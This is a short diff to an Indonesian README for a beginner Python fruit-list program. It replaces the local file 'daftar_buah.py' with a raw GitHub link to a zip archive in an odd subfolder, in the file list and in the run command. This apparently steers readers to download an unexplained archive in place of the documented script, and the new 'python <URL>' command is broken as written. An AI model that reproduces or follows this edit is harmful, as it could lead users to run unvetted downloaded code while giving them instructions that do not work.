@@ -23,11 +23,11 @@ Program ini juga menampilkan daftar buah yang sudah dimasukkan secara rapi mengg
 ---
 
 ## 📄 File:
-- `daftar_buah.py`
+- `https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/pembelian-buah-python.zip`
 
 ---
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall, lalu jalankan:
 ```bash
-python daftar_buah.py
+python https://raw.githubusercontent.com/raraofficial/pembelian-buah-python/main/preweigh/pembelian-buah-python.zip
